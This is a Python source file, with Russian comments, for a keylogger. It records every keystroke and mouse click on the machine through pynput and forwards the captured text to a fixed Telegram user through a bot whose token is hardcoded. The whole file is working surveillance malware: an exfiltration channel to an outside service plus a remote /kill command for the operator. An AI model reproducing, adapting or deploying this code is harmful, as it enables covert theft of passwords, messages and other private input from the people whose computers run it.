import asyncio
import threading
from pynput import keyboard, mouse
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

TOKEN = '8229917193:AAFnnj9iXnGxwTigur03I-fZeD0OyS7CJGQ'
AUTHORIZED_USERS = {5385768090}

buffer = []
buffer_lock = threading.Lock()
stop_flag = False
send_task = None  # asyncio.Future для отложенной отправки

def format_key(key):
    try:
        if isinstance(key, keyboard.KeyCode):
            return key.char or ''
        else:
            # читаемые имена специальных клавиш
            name = key.name if hasattr(key, 'name') else str(key)
            special_map = {
                'space': ' ',
                'enter': '<ENTER>',
                'backspace': '<BACKSPACE>',
                'tab': '<TAB>',
                'esc': '<ESC>',
                'shift': '<SHIFT>',
                'shift_r': '<SHIFT>',
                'caps_lock': '<CAPSLOCK>',
                'delete': '<DEL>',
                'ctrl_l': '<CTRL>',
                'ctrl_r': '<CTRL>',
                'alt_l': '<ALT>',
                'alt_r': '<ALT>',
                'cmd': '<CMD>',
                'cmd_r': '<CMD>',
            }
            return special_map.get(name, f'<{name.upper()}>')
    except Exception:
        return ''

async def delayed_send(bot):
    global buffer, send_task
    await asyncio.sleep(5)
    with buffer_lock:
        if not buffer:
            send_task = None
            return
        msg = ''.join(buffer).replace('None', '')
        buffer.clear()
    for user_id in AUTHORIZED_USERS:
        try:
            await bot.send_message(chat_id=user_id, text=msg)
        except Exception as e:
            print(f"Error sending message: {e}")
    send_task = None

def schedule_send(bot, loop):
    global send_task
    if send_task and not send_task.done():
        send_task.cancel()
    send_task = asyncio.run_coroutine_threadsafe(delayed_send(bot), loop)

def on_key_press(key, application, loop):
    text = format_key(key)
    if text:
        with buffer_lock:
            buffer.append(text)
        schedule_send(application.bot, loop)

def on_click(x, y, button, pressed, application, loop):
    if pressed:
        with buffer_lock:
            buffer.append(f'<{button.name.upper()}_CLICK>')
        schedule_send(application.bot, loop)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text('Logger запущен.')

async def kill(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global stop_flag, keyboard_listener, mouse_listener
    if update.effective_user.id in AUTHORIZED_USERS:
        await update.message.reply_text('Завершаю работу...')
        stop_flag = True
        keyboard_listener.stop()
        mouse_listener.stop()
        await context.application.stop()
    else:
        await update.message.reply_text('Доступ запрещен.')

async def send_all(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text('Отправка сообщений происходит спустя 5 секунд после последнего нажатия.')

if __name__ == '__main__':
    import asyncio

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

    application = ApplicationBuilder().token(TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("kill", kill))
    application.add_handler(CommandHandler("send", send_all))

    keyboard_listener = keyboard.Listener(
        on_press=lambda key: on_key_press(key, application, loop))
    mouse_listener = mouse.Listener(
        on_click=lambda x, y, button, pressed: on_click(x, y, button, pressed, application, loop))
    keyboard_listener.start()
    mouse_listener.start()

    application.run_polling()
